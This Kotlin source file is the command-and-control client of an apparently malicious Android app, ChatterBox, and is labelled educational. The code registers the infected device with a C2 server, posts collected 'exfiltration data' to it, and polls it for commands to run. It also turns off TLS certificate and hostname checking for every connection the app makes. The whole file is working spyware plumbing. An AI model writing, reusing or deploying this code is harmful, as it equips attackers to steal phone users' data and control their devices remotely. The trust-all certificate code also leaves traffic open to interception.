package com.example.ChatterBox.malicious

import android.content.Context
import android.os.AsyncTask
import android.util.Log
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import java.security.cert.X509Certificate
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import java.util.UUID

/**
 * Client for communicating with the Command and Control (C2) server.
 * Handles device registration, data exfiltration, and command retrieval.
 * 
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class C2Client(private val context: Context) {
    private val TAG = "C2Client"
    private var deviceId: String? = null
    
    init {
        // Trust all SSL certificates for the demo
        // NOTE: This is extremely insecure and should NEVER be done in a real app!
        // This is only done here to simplify the demo without proper certificate handling
        trustAllCertificates()
        
        // Generate or retrieve device ID
        deviceId = getOrCreateDeviceId()
    }
    
    /**
     * Register the device with the C2 server
     */
    fun registerDevice() {
        Log.d(TAG, "Registering device with C2 server")
        
        val registrationData = JSONObject().apply {
            put("device_id", deviceId)
            put("model", android.os.Build.MODEL)
            put("manufacturer", android.os.Build.MANUFACTURER)
            put("os_version", android.os.Build.VERSION.RELEASE)
            put("app_version", context.packageManager.getPackageInfo(context.packageName, 0).versionName)
        }
        
        // Execute the network request in the background
        SendDataTask(C2Config.REGISTRATION_ENDPOINT, registrationData.toString()).execute()
    }
    
    /**
     * Send collected data to the C2 server
     */
    fun sendExfiltrationData(dataType: String, data: String) {
        Log.d(TAG, "Sending exfiltration data to C2 server: $dataType")
        
        val exfilData = JSONObject().apply {
            put("device_id", deviceId)
            put("type", dataType)
            put("timestamp", System.currentTimeMillis())
            put("data", data)
        }
        
        // Execute the network request in the background
        SendDataTask(C2Config.EXFILTRATION_ENDPOINT, exfilData.toString()).execute()
    }
    
    /**
     * Check for new commands from the C2 server
     */
    fun checkForCommands(callback: (List<String>) -> Unit) {
        Log.d(TAG, "Checking for commands from C2 server")
        
        // Create a simple request with just the device ID
        val requestData = JSONObject().apply {
            put("device_id", deviceId)
        }
        
        // Execute the request and process the response
        GetCommandsTask(callback).execute(requestData.toString())
    }
    
    /**
     * Get or create a unique device ID
     */
    private fun getOrCreateDeviceId(): String {
        val prefs = context.getSharedPreferences("c2_prefs", Context.MODE_PRIVATE)
        val existingId = prefs.getString("device_id", null)
        
        if (existingId != null) {
            return existingId
        }
        
        // Generate a new UUID if we don't have one
        val newId = UUID.randomUUID().toString()
        prefs.edit().putString("device_id", newId).apply()
        return newId
    }
    
    /**
     * WARNING: This method trusts all SSL certificates.
     * This would be a major security risk in a real app!
     * Only used here for simplicity in the educational demo.
     */
    private fun trustAllCertificates() {
        try {
            val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
                override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
                override fun checkClientTrusted(certs: Array<X509Certificate>, authType: String) {}
                override fun checkServerTrusted(certs: Array<X509Certificate>, authType: String) {}
            })
            
            val sc = SSLContext.getInstance("TLS")
            sc.init(null, trustAllCerts, SecureRandom())
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.socketFactory)
            HttpsURLConnection.setDefaultHostnameVerifier { _, _ -> true }
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up SSL trust", e)
        }
    }
    
    /**
     * AsyncTask to send data to the C2 server
     */
    private inner class SendDataTask(
        private val endpoint: String,
        private val jsonData: String
    ) : AsyncTask<Void, Void, Boolean>() {
        
        override fun doInBackground(vararg params: Void): Boolean {
            try {
                val url = URL(endpoint)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true
                
                // Write the JSON data
                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(jsonData)
                    writer.flush()
                }
                
                // Check the response
                val responseCode = connection.responseCode
                Log.d(TAG, "C2 server response code: $responseCode")
                
                return responseCode == HttpURLConnection.HTTP_OK
            } catch (e: Exception) {
                Log.e(TAG, "Error sending data to C2 server", e)
                return false
            }
        }
        
        override fun onPostExecute(success: Boolean) {
            Log.d(TAG, "Data sent to C2 server: $success")
        }
    }
    
    /**
     * AsyncTask to retrieve commands from the C2 server
     */
    private inner class GetCommandsTask(
        private val callback: (List<String>) -> Unit
    ) : AsyncTask<String, Void, List<String>>() {
        
        override fun doInBackground(vararg params: String): List<String> {
            if (params.isEmpty()) return emptyList()
            
            try {
                val url = URL(C2Config.COMMAND_ENDPOINT)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true
                connection.doInput = true
                
                // Write the request data
                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(params[0])
                    writer.flush()
                }
                
                // Read the response
                val responseCode = connection.responseCode
                if (responseCode != HttpURLConnection.HTTP_OK) {
                    Log.e(TAG, "Error response from C2 server: $responseCode")
                    return emptyList()
                }
                
                // Parse the JSON response
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                
                // Extract commands from the response
                val commands = mutableListOf<String>()
                try {
                    val jsonResponse = JSONObject(response.toString())
                    val commandsArray = jsonResponse.getJSONArray("commands")
                    
                    for (i in 0 until commandsArray.length()) {
                        commands.add(commandsArray.getString(i))
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing commands from response", e)
                }
                
                return commands
            } catch (e: Exception) {
                Log.e(TAG, "Error retrieving commands from C2 server", e)
                return emptyList()
            }
        }
        
        override fun onPostExecute(result: List<String>) {
            Log.d(TAG, "Retrieved ${result.size} commands from C2 server")
            callback(result)
        }
    }
}
